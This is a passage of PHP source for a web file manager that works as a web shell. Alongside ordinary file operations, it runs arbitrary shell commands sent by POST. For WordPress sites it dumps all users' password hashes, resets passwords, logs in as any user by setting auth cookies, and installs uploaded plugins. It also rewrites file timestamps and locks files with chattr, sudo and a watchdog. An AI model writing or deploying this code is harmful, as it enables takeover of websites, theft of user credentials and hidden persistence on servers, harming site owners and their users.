        // ── READ FILE ─────────────────────────────
        case 'read':
            if (fm_is_readonly()) fm_err(t('access_denied'), 403);
            $abs = fm_abs($rel_path);
            if (!is_file($abs)) fm_err(t('not_found'), 404);
            $type = fm_file_type($abs);
            $mime = fm_mime($abs);
            $size = filesize($abs);
            $info = [
                'name'    => basename($abs),
                'path'    => $rel_path,
                'type'    => $type,
                'mime'    => $mime,
                'size'    => $size,
                'size_fmt'=> fm_size_human($size),
                'mtime'   => date($CONFIG['date_format'], filemtime($abs)),
                'perms'   => fm_perms($abs),
                'owner'   => fm_owner($abs),
            ];
            if ($type === 'text') {
                $content = file_get_contents($abs);
                if (!mb_check_encoding($content, 'UTF-8')) {
                    $content = mb_convert_encoding($content, 'UTF-8', 'auto');
                }
                $info['content'] = $content;
            } elseif ($type === 'image') {
                list($w, $h) = @getimagesize($abs) ?: [0,0];
                $info['width']  = $w;
                $info['height'] = $h;
            } elseif ($type === 'archive') {
                $info['entries'] = fm_zip_info($abs);
            }
            fm_ok($info);

        // ── SAVE FILE ─────────────────────────────
        case 'save':
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);
            $abs = fm_abs($rel_path);
            if (!is_file($abs)) fm_err(t('not_found'), 404);
            $content = $_POST['content'] ?? '';
            if (file_put_contents($abs, $content) === false) fm_err('Write failed');
            fm_ok(null, t('saved'));

        // ── MKDIR ─────────────────────────────────
        case 'mkdir':
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);
            $base = fm_abs($rel_path);
            $name = basename(fm_clean($_POST['name'] ?? ''));
            if ($name === '') fm_err('Name required');
            if (!preg_match('/^[^\/\\\\:*?"<>|]+$/', $name)) fm_err('Invalid name');
            $target = $base . '/' . $name;
            if (file_exists($target)) fm_err('Already exists');
            if (!mkdir($target, 0755, true)) fm_err('Failed to create folder');
            fm_ok(null, t('success'));

        // ── MKFILE ────────────────────────────────
        case 'mkfile':
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);
            $base = fm_abs($rel_path);
            $name = basename(fm_clean($_POST['name'] ?? ''));
            if ($name === '') fm_err('Name required');
            if (!preg_match('/^[^\/\\\\:*?"<>|]+$/', $name)) fm_err('Invalid name');
            $target = $base . '/' . $name;
            if (file_exists($target)) fm_err('Already exists');
            if (file_put_contents($target, '') === false) fm_err('Failed to create file');
            fm_ok(null, t('success'));

        // ── DELETE ────────────────────────────────
        case 'delete':
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);
            $items = json_decode($_POST['items'] ?? '[]', true);
            if (empty($items)) fm_err(t('select_items'));
            $errs = [];
            foreach ($items as $item) {
                $abs = fm_abs(fm_clean($item));
                if (!fm_rdelete($abs)) $errs[] = basename($item);
            }
            if ($errs) fm_err('Failed to delete: ' . implode(', ', $errs));
            fm_ok(null, t('deleted'));

        // ── RENAME ────────────────────────────────
        case 'rename':
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);
            $from = fm_abs(fm_clean($_POST['from'] ?? ''));
            $newname = basename(fm_clean($_POST['to'] ?? ''));
            if ($newname === '') fm_err('Name required');
            if (!preg_match('/^[^\/\\\\:*?"<>|]+$/', $newname)) fm_err('Invalid name');
            $to = dirname($from) . '/' . $newname;
            if (!file_exists($from)) fm_err(t('not_found'));
            if (file_exists($to)) fm_err('Already exists');
            if (!rename($from, $to)) fm_err('Rename failed');
            fm_ok(null, t('renamed'));

        // ── TOUCH (change mtime/atime) ────────────
        case 'touch':
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);
            $abs = fm_abs($rel_path);
            if (!file_exists($abs)) fm_err(t('not_found'), 404);
            $datetime = trim($_POST['datetime'] ?? '');
            if ($datetime === '') fm_err('Datetime required');
            $ts = strtotime($datetime);
            if ($ts === false) fm_err('Invalid datetime format');
            if (!@touch($abs, $ts, $ts)) fm_err('Touch failed (permission denied?)');
            fm_ok(['mtime' => $ts, 'mtime_fmt' => date($CONFIG['date_format'], $ts)], 'Date modified');

        // ── COPY ──────────────────────────────────
        case 'copy':
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);
            $items = json_decode($_POST['items'] ?? '[]', true);
            $dest  = fm_abs(fm_clean($_POST['dest'] ?? ''));
            if (!is_dir($dest)) fm_err('Destination not a directory');
            $errs = [];
            foreach ($items as $item) {
                $src = fm_abs(fm_clean($item));
                $target = $dest . '/' . basename($item);
                if (!fm_rcopy($src, $target)) $errs[] = basename($item);
            }
            if ($errs) fm_err('Failed to copy: ' . implode(', ', $errs));
            fm_ok(null, t('success'));

        // ── MOVE ──────────────────────────────────
        case 'move':
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);
            $items = json_decode($_POST['items'] ?? '[]', true);
            $dest  = fm_abs(fm_clean($_POST['dest'] ?? ''));
            if (!is_dir($dest)) fm_err('Destination not a directory');
            $errs = [];
            foreach ($items as $item) {
                $src = fm_abs(fm_clean($item));
                $target = $dest . '/' . basename($item);
                if (file_exists($target)) {
                    fm_rdelete($target);
                }
                if (!rename($src, $target)) $errs[] = basename($item);
            }
            if ($errs) fm_err('Failed to move: ' . implode(', ', $errs));
            fm_ok(null, t('success'));

        // ── DUPLICATE ─────────────────────────────
        case 'duplicate':
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);
            $src  = fm_abs(fm_clean($_POST['item'] ?? ''));
            if (!file_exists($src)) fm_err(t('not_found'));
            $dir  = dirname($src);
            $base = pathinfo($src, PATHINFO_FILENAME);
            $ext  = pathinfo($src, PATHINFO_EXTENSION);
            $ext_s = $ext ? '.' . $ext : '';
            $i = 1;
            do {
                $target = $dir . '/' . $base . '_copy' . ($i > 1 ? $i : '') . $ext_s;
                $i++;
            } while (file_exists($target) && $i < 1000);
            if (!fm_rcopy($src, $target)) fm_err('Duplicate failed');
            fm_ok(null, t('success'));

        // ── UPLOAD ────────────────────────────────
        case 'upload':
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);
            if (empty($_FILES['file'])) fm_err('No file');
            $base  = fm_abs($rel_path);
            $fname = $_FILES['file']['name'];
            $tmp   = $_FILES['file']['tmp_name'];
            $err   = $_FILES['file']['error'];
            if ($err !== UPLOAD_ERR_OK) fm_err('Upload error: ' . $err);
            $fname = basename($fname);
            if (!preg_match('/^[^\/\\\\:*?"<>|]+$/', $fname)) fm_err('Invalid filename');
            $target = $base . '/' . $fname;
            // Chunked upload support
            $chunk_index = (int)($_POST['dzchunkindex'] ?? -1);
            $chunk_total = (int)($_POST['dztotalchunkcount'] ?? 0);
            if ($chunk_total > 0) {
                $part = $target . '.part';
                $mode = $chunk_index === 0 ? 'wb' : 'ab';
                $out  = fopen($part, $mode);
                $in   = fopen($tmp, 'rb');
                stream_copy_to_stream($in, $out);
                fclose($in); fclose($out);
                if ($chunk_index === $chunk_total - 1) {
                    if (file_exists($target)) {
                        $target = $base . '/' . pathinfo($fname, PATHINFO_FILENAME)
                                  . '_' . date('YmdHis') . '.' . pathinfo($fname, PATHINFO_EXTENSION);
                    }
                    rename($part, $target);
                }
            } else {
                if (file_exists($target)) {
                    $target = $base . '/' . pathinfo($fname, PATHINFO_FILENAME)
                              . '_' . date('YmdHis') . '.' . pathinfo($fname, PATHINFO_EXTENSION);
                }
                move_uploaded_file($tmp, $target);
            }
            fm_ok(['filename' => basename($target)], t('uploaded'));

        // ── DOWNLOAD ──────────────────────────────
        case 'download':
            if (fm_is_readonly()) fm_err(t('access_denied'), 403);
            $abs = fm_abs($rel_path);
            if (!is_file($abs)) fm_err(t('not_found'), 404);
            if (session_status() === PHP_SESSION_ACTIVE) session_write_close();
            $fname = basename($abs);
            $size  = filesize($abs);
            $mime  = fm_mime($abs);
            header('Content-Description: File Transfer');
            header('Content-Type: ' . $mime);
            header('Content-Disposition: attachment; filename="' . $fname . '"');
            header('Content-Length: ' . $size);
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            while (ob_get_level()) ob_end_clean();
            readfile($abs);
            exit;

        // ── CHMOD ─────────────────────────────────
        case 'chmod':
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);
            $abs  = fm_abs($rel_path);
            $mode = octdec($_POST['mode'] ?? '0644');
            if (!chmod($abs, $mode)) fm_err('chmod failed');
            fm_ok(null, t('success'));

        // ── ZIP ───────────────────────────────────
        case 'zip':
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);
            $items   = json_decode($_POST['items'] ?? '[]', true);
            $zipname = basename(fm_clean($_POST['zipname'] ?? 'archive_' . date('Ymd_His') . '.zip'));
            if (!str_ends_with($zipname, '.zip')) $zipname .= '.zip';
            $base    = fm_abs($rel_path);
            $zipfile = $base . '/' . $zipname;
            if (!fm_zip_create($zipfile, $items, $base)) fm_err('Zip failed');
            fm_ok(null, t('success'));

        // ── UNZIP ─────────────────────────────────
        case 'unzip':
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);
            $abs   = fm_abs($rel_path);
            $to_folder = (bool)($_POST['to_folder'] ?? false);
            $dest  = dirname($abs);
            if ($to_folder) {
                $dest .= '/' . pathinfo($abs, PATHINFO_FILENAME);
                @mkdir($dest, 0755, true);
            }
            if (!class_exists('ZipArchive')) fm_err('ZipArchive not available');
            $zip = new ZipArchive();
            if ($zip->open($abs) !== true) fm_err('Cannot open archive');
            $st = [];
            fm_zip_extract_safe($zip, $dest, $st);
            $zip->close();
            fm_ok($st, t('success'));

        // ── UPLOAD + EXTRACT (one shot) ───────────
        case 'upload_extract':
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);
            if (empty($_FILES['file'])) fm_err('No file');
            if (!class_exists('ZipArchive')) fm_err('ZipArchive not available');
            $base  = fm_abs($rel_path);
            $fname = basename($_FILES['file']['name']);
            $tmp   = $_FILES['file']['tmp_name'];
            $err   = $_FILES['file']['error'];
            if ($err !== UPLOAD_ERR_OK) fm_err('Upload error: ' . $err);
            if (!preg_match('/^[^\/\\\\:*?"<>|]+$/', $fname)) fm_err('Invalid filename');
            if (strtolower(pathinfo($fname, PATHINFO_EXTENSION)) !== 'zip') fm_err('Must be a .zip file');

            // Chunked upload support (same dzchunkindex scheme as the plain upload action)
            $chunk_index = (int)($_POST['dzchunkindex'] ?? -1);
            $chunk_total = (int)($_POST['dztotalchunkcount'] ?? 0);
            $zipPath = $base . '/.__upload_extract_' . md5($fname . ($_POST['dzuuid'] ?? '')) . '.zip';

            if ($chunk_total > 0) {
                $mode = $chunk_index === 0 ? 'wb' : 'ab';
                $out  = fopen($zipPath, $mode);
                $in   = fopen($tmp, 'rb');
                stream_copy_to_stream($in, $out);
                fclose($in); fclose($out);
                // Only extract on the final chunk; ack earlier chunks
                if ($chunk_index !== $chunk_total - 1) fm_ok(['chunk' => $chunk_index], 'chunk received');
            } else {
                if (!move_uploaded_file($tmp, $zipPath)) fm_err('Move failed');
            }

            // Extract safely
            $zip = new ZipArchive();
            if ($zip->open($zipPath) !== true) { @unlink($zipPath); fm_err('Cannot open archive'); }
            $st = [];
            fm_zip_extract_safe($zip, $base, $st);
            $zip->close();
            @unlink($zipPath);
            $st['zip_name'] = $fname;
            fm_ok($st, 'ZIP extracted');

        // ── WORDPRESS ─────────────────────────────
        case 'wp_info':
            fm_verify_token();
            if (!fm_wp_bootstrap()) fm_err('WordPress not detected here', 404);
            fm_ok([
                'wp_root'    => fm_wp_detect(),
                'abspath'    => defined('ABSPATH') ? ABSPATH : '',
                'site_url'   => function_exists('site_url')   ? site_url()   : '',
                'home_url'   => function_exists('home_url')   ? home_url()   : '',
                'admin_url'  => function_exists('admin_url')  ? admin_url()  : '',
                'version'    => $GLOBALS['wp_version']        ?? '?',
                'db_host'    => defined('DB_HOST') ? DB_HOST : '',
                'db_name'    => defined('DB_NAME') ? DB_NAME : '',
                'db_user'    => defined('DB_USER') ? DB_USER : '',
            ], 'ok');

        case 'wp_users':
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);
            if (!fm_wp_bootstrap()) fm_err('WordPress not detected here', 404);
            global $wpdb;
            $rows = $wpdb->get_results(
                "SELECT ID, user_login, user_email, user_registered, user_pass FROM {$wpdb->users} ORDER BY ID ASC",
                ARRAY_A
            );
            $out = [];
            foreach ((array)$rows as $u) {
                $ud    = get_userdata($u['ID']);
                $roles = $ud && !empty($ud->roles) ? implode(', ', $ud->roles) : '';
                $out[] = [
                    'id'       => (int)$u['ID'],
                    'login'    => $u['user_login'],
                    'email'    => $u['user_email'],
                    'reg'      => $u['user_registered'],
                    'pass'     => $u['user_pass'],
                    'roles'    => $roles,
                ];
            }
            fm_ok($out, 'ok');

        case 'wp_user_reset':
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);
            if (!fm_wp_bootstrap()) fm_err('WordPress not detected here', 404);
            $uid = (int)($_POST['uid'] ?? 0);
            if ($uid <= 0) fm_err('Invalid user id');
            if (!get_userdata($uid)) fm_err('User not found', 404);
            $newpass = wp_generate_password(16, true, false);
            wp_set_password($newpass, $uid);
            fm_ok(['uid' => $uid, 'password' => $newpass], 'Password reset');

        case 'wp_user_login':
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);
            if (!fm_wp_bootstrap()) fm_err('WordPress not detected here', 404);
            $uid = (int)($_POST['uid'] ?? 0);
            if ($uid <= 0) fm_err('Invalid user id');
            $user = get_userdata($uid);
            if (!$user) fm_err('User not found', 404);
            wp_clear_auth_cookie();
            wp_set_current_user($uid, $user->user_login);
            wp_set_auth_cookie($uid, true);
            do_action('wp_login', $user->user_login, $user);
            fm_ok([
                'uid'       => $uid,
                'login'     => $user->user_login,
                'admin_url' => admin_url(),
            ], 'Login cookie set');

        case 'wp_plugins':
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);
            if (!fm_wp_bootstrap()) fm_err('WordPress not detected here', 404);
            if (!function_exists('get_plugins')) require_once ABSPATH . 'wp-admin/includes/plugin.php';
            $all    = get_plugins();
            $active = (array) get_option('active_plugins', []);
            $out = [];
            foreach ($all as $slug => $p) {
                $out[] = [
                    'slug'    => $slug,
                    'name'    => $p['Name']    ?? $slug,
                    'version' => $p['Version'] ?? '',
                    'author'  => wp_strip_all_tags($p['Author'] ?? ''),
                    'active'  => in_array($slug, $active, true),
                ];
            }
            usort($out, function($a, $b) { return strcasecmp($a['name'], $b['name']); });
            fm_ok($out, 'ok');

        case 'wp_plugin_act':
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);
            if (!fm_wp_bootstrap()) fm_err('WordPress not detected here', 404);
            if (!function_exists('activate_plugin')) require_once ABSPATH . 'wp-admin/includes/plugin.php';
            $ac   = $_POST['ac']   ?? '';
            $slug = $_POST['slug'] ?? '';
            if (!$slug) fm_err('Missing slug');
            switch ($ac) {
                case 'a':
                    $r = activate_plugin($slug);
                    if (is_wp_error($r)) fm_err($r->get_error_message());
                    fm_ok(null, 'Plugin activated');
                case 'd':
                    deactivate_plugins([$slug]);
                    fm_ok(null, 'Plugin deactivated');
                case 'x':
                    deactivate_plugins([$slug]);
                    $r = delete_plugins([$slug]);
                    if (is_wp_error($r) || $r === false) fm_err('Delete failed');
                    fm_ok(null, 'Plugin deleted');
                default:
                    fm_err('Unknown action');
            }
            break;

        case 'wp_plugin_upload':
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);
            if (!fm_wp_bootstrap()) fm_err('WordPress not detected here', 404);
            if (empty($_FILES['file'])) fm_err('No file');
            if (!class_exists('ZipArchive')) fm_err('ZipArchive not available');
            $fname = basename($_FILES['file']['name']);
            if (strtolower(pathinfo($fname, PATHINFO_EXTENSION)) !== 'zip') fm_err('Must be a .zip plugin');
            $src = $_FILES['file']['tmp_name'];
            if (!is_uploaded_file($src)) fm_err('Invalid upload');

            // Extract into wp-content/plugins/
            $pluginsDir = WP_PLUGIN_DIR;
            if (!is_dir($pluginsDir) || !is_writable($pluginsDir)) fm_err('Plugins dir not writable');
            $zip = new ZipArchive();
            if ($zip->open($src) !== true) fm_err('Cannot open plugin ZIP');
            $st = [];
            fm_zip_extract_safe($zip, $pluginsDir, $st);
            $zip->close();
            fm_ok($st, 'Plugin installed');

        // ── SEARCH ────────────────────────────────
        case 'search':
            $base  = fm_abs($rel_path);
            $query = strtolower(trim($_POST['query'] ?? ''));
            if (strlen($query) < 2) fm_err('Query too short');
            $results = [];
            $is_ro = fm_is_readonly();
            try {
                $iter = new RecursiveIteratorIterator(
                    new RecursiveCallbackFilterIterator(
                        new RecursiveDirectoryIterator($base, FilesystemIterator::SKIP_DOTS),
                        function($current) {
                            $ft = @filetype($current->getPathname());
                            if ($ft === false || in_array($ft, ['socket', 'fifo', 'char', 'block', 'unknown'], true)) return false;
                            return true;
                        }
                    ),
                    RecursiveIteratorIterator::SELF_FIRST
                );
                foreach ($iter as $file) {
                    try {
                        $fname = $file->getFilename();
                        if ($is_ro) {
                            if (str_starts_with($fname, '.')) continue;
                            if (!$file->isDir()) continue;
                        }
                        if (stripos($fname, $query) !== false) {
                            $path = str_replace('\\', '/', $file->getPathname());
                            $rel  = fm_rel($path);
                            $results[] = [
                                'name'   => $file->getFilename(),
                                'path'   => $rel,
                                'is_dir' => $file->isDir(),
                                'size'   => $file->isFile() ? fm_size_human($file->getSize()) : '',
                            ];
                            if (count($results) >= 200) break;
                        }
                    } catch (\Throwable $e) { continue; }
                }
            } catch (\Throwable $e) { /* partial results OK */ }
            fm_ok($results);

        // ── TREE ──────────────────────────────────
        case 'tree':
            $abs = fm_abs($rel_path);
            if (!is_dir($abs)) fm_err('Not a directory');
            $dirs = [];
            // Admin always sees hidden; readonly never sees hidden
            $tree_show_hidden = fm_is_readonly() ? false : true;
            foreach (@scandir($abs) ?: [] as $name) {
                if ($name === '.' || $name === '..') continue;
                if (!$tree_show_hidden && str_starts_with($name, '.')) continue;
                $full = $abs . '/' . $name;
                $ft = @filetype($full);
                if ($ft === 'dir' || @is_dir($full)) {
                    $dirs[] = [
                        'name' => $name,
                        'path' => ($rel_path ? $rel_path . '/' : '') . $name,
                    ];
                }
            }
            fm_ok($dirs);

        // ── TERMINAL ──────────────────────────────
        case 'terminal':
            if (!$CONFIG['allow_terminal']) fm_err('Terminal disabled', 403);
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);
            $cmd = $_POST['cmd'] ?? '';
            $cwd = fm_abs($rel_path);
            if (!is_dir($cwd)) $cwd = FM_ROOT;
            $cmd = 'cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1; echo "__CWD__:$(pwd)"';
            $output = [];
            $ret    = 0;
            exec($cmd, $output, $ret);
            $new_cwd = $cwd;
            $lines   = [];
            foreach ($output as $line) {
                if (str_starts_with($line, '__CWD__:')) {
                    $raw = substr($line, 8);
                    $new_cwd = str_replace('\\', '/', $raw);
                } else {
                    $lines[] = $line;
                }
            }
            fm_ok([
                'output'  => implode("\n", $lines),
                'cwd'     => fm_rel($new_cwd) ?: '',
                'exit'    => $ret,
            ]);

        // ── SETTINGS ──────────────────────────────
        case 'settings':
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);
            $cfg = json_decode($_POST['config'] ?? '{}', true);
            foreach (['lang','theme','show_hidden','date_format'] as $k) {
                if (isset($cfg[$k])) $CONFIG[$k] = $cfg[$k];
            }
            $_SESSION[FM_SESSION]['config'] = $CONFIG;
            fm_ok(null, t('saved'));

        // ── HASH ──────────────────────────────────
        case 'hash':
            $pwd = $_POST['password'] ?? '';
            if ($pwd === '') fm_err('Password required');
            fm_ok(['hash' => password_hash($pwd, PASSWORD_DEFAULT)]);

        // ── CHANGE PASSWORD (current logged-in user only) ──
        case 'change_password':
            fm_verify_token();
            global $auth_users;
            $user = $_SESSION[FM_SESSION]['user'] ?? '';
            if ($user === '' || !isset($auth_users[$user])) fm_err('Not logged in', 401);
            if (fm_is_readonly()) fm_err('Read-only users cannot change password', 403);
            $old = $_POST['old_password'] ?? '';
            $new = $_POST['new_password'] ?? '';
            $confirm = $_POST['confirm_password'] ?? '';
            if ($old === '' || $new === '') fm_err('Old and new password required');
            if (strlen($new) < 6) fm_err('New password must be at least 6 characters');
            if ($new !== $confirm) fm_err('New password and confirmation do not match');
            if (!password_verify($old, $auth_users[$user])) fm_err('Old password is incorrect', 401);

            $new_hash = password_hash($new, PASSWORD_DEFAULT);
            $cfg_file = __DIR__ . '/filepro-config.php';

            // Build/merge override file safely
            $existing_lines = [];
            $other_lines = []; // lines that are not for THIS user's password
            if (is_file($cfg_file)) {
                $raw = @file_get_contents($cfg_file);
                if ($raw !== false) {
                    $lines = preg_split('/\r?\n/', $raw);
                    foreach ($lines as $ln) {
                        $t = trim($ln);
                        if ($t === '' || $t === '<?php' || strpos($t, '//') === 0 || strpos($t, '#') === 0) continue;
                        // Skip the line that sets this user's password (we'll rewrite it)
                        if (preg_match('/\$auth_users\s*\[\s*[\'"]'.preg_quote($user,'/').'[\'"]\s*\]\s*=/', $ln)) continue;
                        $other_lines[] = rtrim($ln);
                    }
                }
            }

            $out  = "<?php\n";
            $out .= "// Auto-generated by File Manager — do not edit manually unless you know what you're doing.\n";
            $out .= "// Last updated: " . date('Y-m-d H:i:s') . "\n";
            foreach ($other_lines as $ln) $out .= $ln . "\n";
            $out .= "\$auth_users['" . addslashes($user) . "'] = '" . addslashes($new_hash) . "';\n";

            if (@file_put_contents($cfg_file, $out, LOCK_EX) === false) {
                fm_err('Failed to write filepro-config.php — check that the directory is writable');
            }
            @chmod($cfg_file, 0600);

            // Update in-memory so the rest of this request still works
            $auth_users[$user] = $new_hash;
            // Force re-login on next request for safety
            // (don't destroy session immediately so the success response goes through)
            $_SESSION[FM_SESSION]['_pw_changed'] = true;
            fm_ok(null, 'Password changed successfully — please log in again with your new password');

        // ── INFO ──────────────────────────────────
        case 'info':
            $abs = fm_abs($rel_path);
            if (!file_exists($abs)) fm_err(t('not_found'), 404);
            $stat = @stat($abs);
            $info = [
                'name'    => basename($abs),
                'path'    => $rel_path,
                'abs'     => $abs,
                'is_dir'  => @is_dir($abs),
                'size'    => @is_file($abs) && is_array($stat) ? ($stat['size'] ?? 0) : null,
                'size_fmt'=> @is_file($abs) && is_array($stat) ? fm_size_human($stat['size'] ?? 0) : '',
                'mtime'   => is_array($stat) ? date($CONFIG['date_format'], $stat['mtime'] ?? 0) : '?',
                'atime'   => is_array($stat) ? date($CONFIG['date_format'], $stat['atime'] ?? 0) : '?',
                'perms'   => @fm_perms($abs) ?: '0000',
                'owner'   => @fm_owner($abs) ?: '?',
                'mime'    => @is_file($abs) ? fm_mime($abs) : '',
            ];
            if (is_file($abs) && fm_is_image($abs)) {
                list($w, $h) = @getimagesize($abs) ?: [0,0];
                $info['width']  = $w;
                $info['height'] = $h;
            }
            fm_ok($info);

        // ── PROTECT FILE (crontab watchdog) ───────
        case 'qlock':
            // Quick Lock — exact match to user's shell snippet
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);
            $item_path = fm_abs(fm_clean($_POST['item'] ?? ''));
            if (!file_exists($item_path)) fm_err('Item not found', 404);
            $real = realpath($item_path); $real_root = realpath(FM_CWD_ROOT);
            if (!$real || !$real_root || strpos($real, $real_root) !== 0) fm_err('Path outside root', 403);
            if ($real === realpath(__FILE__)) fm_err('Cannot lock the file manager script itself', 403);
            $fd = 0; $ff = 0;
            if (is_file($item_path)) {
                @chmod($item_path, 0444); $ff++;
            } else {
                @chmod($item_path, 0555);
                try {
                    $ri = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($item_path),
                        RecursiveIteratorIterator::SELF_FIRST
                    );
                    foreach ($ri as $f) {
                        if ($f->getFilename() === '.' || $f->getFilename() === '..') continue;
                        if ($f->isDir()) { @chmod($f->getPathname(), 0555); $fd++; }
                        else { @chmod($f->getPathname(), 0444); $ff++; }
                    }
                } catch (Exception $e) {}
            }
            fm_ok(['files'=>$ff,'dirs'=>$fd], "LOCKED: $fd folders → 0555, $ff files → 0444");

        case 'qunlock':
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);
            $item_path = fm_abs(fm_clean($_POST['item'] ?? ''));
            if (!file_exists($item_path)) fm_err('Item not found', 404);
            $real = realpath($item_path); $real_root = realpath(FM_CWD_ROOT);
            if (!$real || !$real_root || strpos($real, $real_root) !== 0) fm_err('Path outside root', 403);
            $fd = 0; $ff = 0;
            if (is_file($item_path)) {
                @chmod($item_path, 0644); $ff++;
            } else {
                @chmod($item_path, 0755);
                try {
                    $ri = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($item_path),
                        RecursiveIteratorIterator::SELF_FIRST
                    );
                    foreach ($ri as $f) {
                        if ($f->getFilename() === '.' || $f->getFilename() === '..') continue;
                        if ($f->isDir()) { @chmod($f->getPathname(), 0755); $fd++; }
                        else { @chmod($f->getPathname(), 0644); $ff++; }
                    }
                } catch (Exception $e) {}
            }
            fm_ok(['files'=>$ff,'dirs'=>$fd], "UNLOCKED: $fd folders → 0755, $ff files → 0644");

        case 'lock_chattr':
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);
            $item = fm_abs(fm_clean($_POST['item'] ?? ''));
            $real = realpath($item); $rr = realpath(FM_CWD_ROOT);
            if (!$real || !$rr || strpos($real,$rr)!==0) fm_err('Path outside root',403);
            if ($real === realpath(__FILE__)) fm_err('Cannot lock the file manager itself',403);
            // Try chattr without sudo first, then with sudo
            $ok_chattr = false;
            $chattr_msg = '';
            foreach (['chattr -R +i ', 'sudo -n chattr -R +i '] as $prefix) {
                $cmd = $prefix . escapeshellarg($real) . ' 2>&1';
                $out = []; $rc = 0; @exec($cmd, $out, $rc);
                if ($rc === 0) { $ok_chattr = true; break; }
                $chattr_msg = implode(' ', $out);
            }
            // Always chmod for safety
            @chmod($real, is_dir($real)?0555:0444);
            if (is_dir($real)) {
                try { $ri = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($real), RecursiveIteratorIterator::SELF_FIRST);
                foreach ($ri as $f) { if ($f->getFilename()==='.'||$f->getFilename()==='..') continue; @chmod($f->getPathname(), $f->isDir()?0555:0444); }
                } catch (Exception $e) {}
            }
            if ($ok_chattr) {
                fm_ok(null, 'Locked permanently with chattr +i + chmod 0555/0444');
            } else {
                fm_ok(['fallback'=>true], 'chattr not available (' . $chattr_msg . '). Locked with chmod only. Use "Lock & Watch" for persistent protection.');
            }

        case 'unlock_chattr':
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);
            $item = fm_abs(fm_clean($_POST['item'] ?? ''));
            $real = realpath($item); $rr = realpath(FM_CWD_ROOT);
            if (!$real || !$rr || strpos($real,$rr)!==0) fm_err('Path outside root',403);
            // Try chattr without sudo first, then with sudo
            foreach (['chattr -R -i ', 'sudo -n chattr -R -i '] as $prefix) {
                $cmd = $prefix . escapeshellarg($real) . ' 2>&1';
                $out = []; $rc = 0; @exec($cmd, $out, $rc);
                if ($rc === 0) break;
            }
            @chmod($real, is_dir($real)?0755:0644);
            if (is_dir($real)) {
                try { $ri = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($real), RecursiveIteratorIterator::SELF_FIRST);
                foreach ($ri as $f) { if ($f->getFilename()==='.'||$f->getFilename()==='..') continue; @chmod($f->getPathname(), $f->isDir()?0755:0644); }
                } catch (Exception $e) {}
            }
            fm_ok(null, 'Unlocked (permissions restored to 0755/0644)');

        case 'lock_watch':
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);
            $item = fm_abs(fm_clean($_POST['item'] ?? ''));
            $real = realpath($item); $rr = realpath(FM_CWD_ROOT);
            if (!$real || !$rr || strpos($real,$rr)!==0) fm_err('Path outside root',403);
            if ($real === realpath(__FILE__)) fm_err('Cannot watch the file manager itself',403);
            $pdir = FM_ROOT . '/.fm_protected';
            if (!is_dir($pdir)) @mkdir($pdir, 0755, true);
            $hash = substr(sha1($real), 0, 12);
            $script = $pdir . '/watchlock.' . $hash . '.php';
            $pidfile = $pdir . '/watchlock.' . $hash . '.pid';
            $stopfile = $pdir . '/watchlock.' . $hash . '.stop';
            $logfile = $pdir . '/watchlock.log';
            // Kill existing watchdog if running
            if (is_file($pidfile)) {
                $old_pid = (int)@file_get_contents($pidfile);
                if ($old_pid > 0) { @exec('kill '.$old_pid.' 2>&1'); @exec('kill -9 '.$old_pid.' 2>&1'); }
            }
            // Initial lock
            @chmod($real, is_dir($real)?0555:0444);
            if (is_dir($real)) {
                try {
                    $ri = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($real), RecursiveIteratorIterator::SELF_FIRST);
                    foreach ($ri as $f) { if ($f->getFilename()==='.'||$f->getFilename()==='..') continue;
                        @chmod($f->getPathname(), $f->isDir()?0555:0444); }
                } catch (Exception $e) {}
            }
            // Build snapshot of current permissions
            $snap_code = '';
            if (is_dir($real)) {
                $snap_code .= "\$snap=[];\n";
                $snap_code .= "\$snap[".var_export($real,true)."]=".decoct(is_dir($real)?0555:0444).";\n";
                try {
                    $ri = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($real), RecursiveIteratorIterator::SELF_FIRST);
                    foreach ($ri as $f) {
                        if ($f->getFilename()==='.'||$f->getFilename()==='..') continue;
                        $fp = $f->getPathname();
                        $perm = $f->isDir() ? '0555' : '0444';
                        $snap_code .= "\$snap[".var_export($fp,true)."]=".$perm.";\n";
                    }
                } catch (Exception $e) {}
            }
